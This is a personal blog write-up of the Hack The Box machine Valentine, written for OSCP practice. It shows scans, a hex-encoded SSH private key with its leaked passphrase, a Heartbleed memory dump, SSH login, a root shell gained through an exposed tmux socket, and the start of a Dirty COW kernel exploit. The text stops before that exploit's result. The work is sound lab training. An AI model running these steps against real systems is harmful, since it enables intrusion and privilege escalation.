---
title: "Hack The Box - Valentine"
description: "This is a write up about the hackthebox machine Valentine"
author: "Gian Rathgeb"
date: 2021-09-01T12:34:30+1:00
categories:
  - HackTheBox
  - WriteUp
  - Linux
tags:
  - OSCP Preparation
  - Heartbleed
  - Dirty Cow
  - Nmap
  - Gobuster
---

# Introduction

---

The box I try today is called Valentine. This box should be a good preparation for the OSCP exam, that's the reason why I want to solve it. The box has a 4.6 rating, which is pretty good in my eyes. So let me start with the enumeration of the box.

# Enumeration

---

I start with a nmap scan and will then try to enumerate all the services found with the scans.

## Nmap Scan

---

As always, I do a basic scan of all ports first:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ sudo nmap -p- valentine.htb -sS -o nmapAllPorts.txt   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 13:42 CEST
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.23s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE                                
22/tcp  open  ssh                                    
80/tcp  open  http                                   
443/tcp open  https                                  

Nmap done: 1 IP address (1 host up) scanned in 1465.89 seconds
```

And than a deep scan of those 3 ports that are open:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ nmap -p 22,80,443 -A -o nmapDeepScan.txt valentine.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 14:09 CEST
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.28s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                       
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site does not have a title (text/html).
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site does not have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-08-23T12:17:29+00:00; +7m55s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:                                 
|_clock-skew: 7m54s                                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
```

Before enumerating the services, I perform a script scan, which may find vulnerabilities:

```bash
──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]                                                                                                                                                                                          
└─$ nmap valentine.htb --script vuln                                                                                                                                                                                                   255 ⨯ 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 20:06 CEST                                                                                                                                                                             
Pre-scan script results:                                                                                                                                                                                                                     
| broadcast-avahi-dos:                                                                                                                                                                                                                       
|   Discovered hosts:                                                                                                                                                                                                                        
|     224.0.0.251                                                                                                                                                                                                                            
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                                                                                         
|_  Hosts are all up (not vulnerable).                                                                                                                                                                                                       
Nmap scan report for valentine.htb (10.10.10.79)                                                                                                                                                                                             
Host is up (0.051s latency).                                                                                                                                                                                                                 
Not shown: 997 closed ports                                                                                                                                                                                                                  
PORT    STATE SERVICE                                                                                                                                                                                                                        
22/tcp  open  ssh                                                                                                                                                                                                                            
80/tcp  open  http
---snip---
ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could 
allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```

As you see the target is vulnerable to ssl-heartbleed. I can search an exploit later. (In the exploitation section of this write-up)

## Enumerating The Services

---

Since there are not many vulnerabilities in the OpenSSH service, I just made a quick google search for exploits, but there aren't any, so I start enumerating the other ports.

### Port 80

---

On this port runs a HTTP web server, I started the enumeration with a Gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]        
└─$ cat gobuster.txt
/index                (Status: 200) [Size: 38]                  
/index.php            (Status: 200) [Size: 38]   
/dev                  (Status: 301) [Size: 312] [--> http://valentine.htb/dev/]
/decode               (Status: 200) [Size: 552]
/decode.php           (Status: 200) [Size: 552]
/encode               (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
```

The page, as it is, is not very useful, there is only an image with which I analyzed in a later section. 

I went to the dev directory, there are two files, notes.txt and hype_key. 

The file notes.txt gives me a little hint that the encoding is broke, but that information is useless for now:

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

I check the other file, hype_key:

```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```

It looks like this is the encoded message that notes.txt refers to. It looks like hex, so I decode it:

[Online Hex to Text Decoder](https://www.convertstring.com/EncodeDecode/HexDecode)

The output is a private RSA key, which can probably be used for SSH:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

This key might be used to make a connection over SSH. But before accessing, I check the other services running on the machine. (And analyzing the image)

There is also a decode and encode page, which encodes/decodes base64 to plain text. 

### Port 443

---

On this port runs a HTTPS web server, I started the enumeration with a Gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]    
└─$ cat gobuster-https.txt                    
/index                (Status: 200) [Size: 38]   
/index.php            (Status: 200) [Size: 38]   
/dev                  (Status: 301) [Size: 314] [--> https://valentine.htb/dev/]
/decode               (Status: 200) [Size: 552]
/decode.php           (Status: 200) [Size: 552]
/encode               (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
```

The page is exactly the same as the HTTP site on port 80, so I do not have to enumerate this port any further. I analyzed the image in the section below.

### Analyzing The Image On The Web Sites

---

On both websites is the same image, I tried a few things to make sure no steganography is inside it:

- Analyzed the file using `strings`
- Checked the magic bytes with a hex editor, it is really a jpeg
- Used Exiftool to get more information, but nothing found
- Tried extracting information with Steghide, nothing found (also tried some passwords that have something in common with the name of the box, like valentine)
- Tried to bruteforce the password using  Stegoveritas & Stegseek

I come to the decision that there are no hidden things inside the image.

# Try To Access SSH

---

I already found a key file, but I have no username. Maybe it is valentine, because that is the name of the box.

First, set the correct permissions on the file and try to SSH:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ chmod 600 id_rsa
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ ssh valentine@valentine.htb -i id_rsa                                       
The authenticity of host 'valentine.htb (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'valentine.htb,10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

This seems to work, but I need to crack the password.

# Finding An Exploit

---

I know that the machine is vulnerable to the heartbleed vulnerability. So I search for an exploit:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ searchsploit heartbleed              
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple S | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                 | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)  | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                    | multiple/remote/32745.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ searchsploit -m 32764.py                                                                                      1 ⨯
  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)
      URL: https://www.exploit-db.com/exploits/32764
     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/valentine/32764.py

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ cp 32764.py heartbleed.py
```

There is the exploit, I execute it. I scrolled through the output and found this:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]                                                                                                                                                                                          
└─$ python heartbleed.py valentine.htb                                                                                                                                                                                                       
Trying SSL 3.0...                                                                                                                                                                                                                            
Connecting...                                                                                                                                                                                                                                
Sending Client Hello...                                                                                                                                                                                                                      
Waiting for Server Hello...                                                                                                                                                                                                                  
 ... received message: type = 22, ver = 0300, length = 94                                                                                                                                                                                    
 ... received message: type = 22, ver = 0300, length = 885                                                                                                                                                                                   
 ... received message: type = 22, ver = 0300, length = 331                                                                                                                                                                                   
 ... received message: type = 22, ver = 0300, length = 4                                                                                                                                                                                     
Sending heartbeat request...                                                                                                                                                                                                                 
 ... received message: type = 24, ver = 0300, length = 16384                                                                                                                                                                                 
Received heartbeat response:                                                                                                                                                                                                                 
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...                                                                                                                                                                    
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......                                                                                                                                                                    
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".                                                                                                                                                                    
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.                                                                                                                                                                    
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................                                                                                                                                                                    
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.                                                                                                                                                                    
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...                                                                                                                                                                    
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............                                                                                                                                                                    
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................                                                                                                                                                                    
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.                                                                                                                                                                    
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............                                                                                                                                                                    
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................                                                                                                                                                                    
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................                                                                                                                                                                    
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 00 26 00 24  ....#........&.$                                                                                                                                                                    
  00e0: 00 1D 00 20 64 10 BE 74 18 5E 76 01 93 43 66 41  ... d..t.^v..CfA                                                                                                                                                                    
  00f0: 48 F9 C7 9B C5 AC 9B 0B A7 04 80 E3 2C 3B A2 A2  H...........,;..                                                                                                                                                                    
  0100: DA 63 3C 2B 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  .c<+ion/x-www-fo                                                                                                                                                                    
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C                                                                                                                                                                    
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4                                                                                                                                                                    
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc                                                                                                                                                                    
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld                                                                                                                                                                    
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 36  mV0aGVoeXBlCg==6                                                                                                                                                                    
  0160: F5 23 CB 65 E6 4B 34 F2 1B 72 DE 1B C7 EE 60 3A  .#.e.K4..r....`:                                                                                                                                                                    
  0170: C4 B3 EA 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................                                                                                                                                                                    
  0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................                                                                                                                                                                    
  0190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
```

The interesting text is `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`. I try to decode it using the decoder site found:

```
Your input:

aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Your encoded input:

heartbleedbelievethehype
```

That may be the password for the for the ssh key, but first I need to decrypt the private key:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ openssl rsa -in id_rsa -out decrypted_id_rsa                                                                                                                                                                                       130 ⨯
Enter pass phrase for id_rsa:
writing RSA key
                                                                                                                                                                                                                                             
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ ls
32764.py  decrypted_id_rsa  gobuster-https.txt  gobuster.txt  heartbleed.py  id_rsa  id_rsa_hash.txt  index.jpeg  nmapAllPorts.txt  nmapDeepScan.txt  results
```

So now I try it again to log in with SSH. That did not work, so I may change the user. I found the key in this URL: [https://valentine.htb/dev/hype_key](https://valentine.htb/dev/hype_key), so the username may be hype:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ ssh hype@valentine.htb -i decrypted_id_rsa
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Aug 23 06:50:16 2021 from 10.10.14.10
hype@Valentine:~$ whoami
hype
```

That worked, so I can get the user flag.

## User Flag

---

I got the shell as the user hype, which owns the use flag. So I can get it:

```bash
hype@Valentine:~$ cd Desktop
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt
e6**************************1750
```

# Privilege Escalation

---

In the tmp folder, there is a copy of the inPEAS script, the output of it is stored inside a file. I analyzed it and found two things that are critical:

![Untitled](/assets/images/2021-09-01-valentine/img1.png)

![Untitled](/assets/images/2021-09-01-valentine/img2.png)

I first want to try the tmux vulnerability, because the kernel exploit may crash the machine:

```bash
hype@Valentine:~/tmp$ ps aux | grep tmux
root       1027  0.0  0.1  26416  1600 ?        Ss   03:38   0:10 /usr/bin/tmux -S /.devs/dev_sess
hype      27376  0.0  0.0  13580   924 pts/0    S+   11:59   0:00 grep --color=auto tmux
```

I try to execute the same command again and it worked, I am now root:

```bash
hype@Valentine:~/tmp$ /usr/bin/tmux -S /.devs/dev_sess
root@Valentine:/home/hype/tmp# whoami
root
```

There is the root shell, time to grab that flag.

## Getting The Root Flag

---

The root flag lies in /root:

```bash
root@Valentine:/home/hype/tmp# cat /root/root.txt
f1**************************65b2
```

# Trying The Kernel Exploit

---

In this section, I exit the root shell and try to get root via the kernel exploit. If the machine would crash, I just leave this section uncompleted.

The kernel exploit (3.2.0-23) I found is also known under the name `dirty cow`:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ searchsploit dirty                                                                                          130 ⨯
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)              | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)              | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Pri | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Esc | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Acces | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege  | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access | linux/local/40611.c
Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_dirty() in KGSL     | android/dos/46941.txt
Quick and Dirty Blog (qdblog) 0.4 - 'categories.php' Local File Inclusion           | php/webapps/4603.txt
Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion            | php/webapps/3729.txt
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)                 | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)                 | linux/local/46362.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                      
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/valentine]
└─$ searchsploit -m exploits/linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/valentine/40839.c
```

I upload the exploit to the machine, after the transfer is done, I compile it:

```bash
ype@Valentine:~/tmp$ gcc -pthread 40839.c -o c -lcrypt
hype@Valentine:~/tmp$ ls
40839.c  c  linout.txt  linpeas.sh
hype@Valentine:~/tmp$  file c
